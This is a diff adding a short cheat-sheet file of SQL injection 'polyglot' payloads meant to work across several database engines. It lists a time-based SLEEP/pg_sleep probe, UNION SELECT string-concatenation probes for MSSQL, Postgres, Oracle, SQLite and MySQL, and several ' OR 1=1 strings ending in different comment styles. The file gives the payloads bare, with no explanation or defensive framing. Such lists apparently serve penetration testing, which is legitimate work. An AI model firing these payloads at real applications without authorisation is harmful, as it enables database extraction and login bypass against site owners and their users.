@@ -1,0 +1,16 @@
+# SQLi Polyglots (Work across multiple DBs)
+
+# Generic Sleep Polyglot
+' AND 1=(SELECT 1 FROM (SELECT(SLEEP(5)))a) UNION SELECT pg_sleep(5) --
+
+# String Concatenation Polyglot
+' UNION SELECT 'a' + 'b' -- (MSSQL)
+' UNION SELECT 'a' || 'b' -- (Postgres, Oracle, SQLite)
+' UNION SELECT CONCAT('a','b') -- (MySQL)
+
+# Comment Polyglot
+' OR 1=1 /*
+' OR 1=1 #
+' OR 1=1 -- -
+' OR 1=1 --
+' OR 1=1 ;
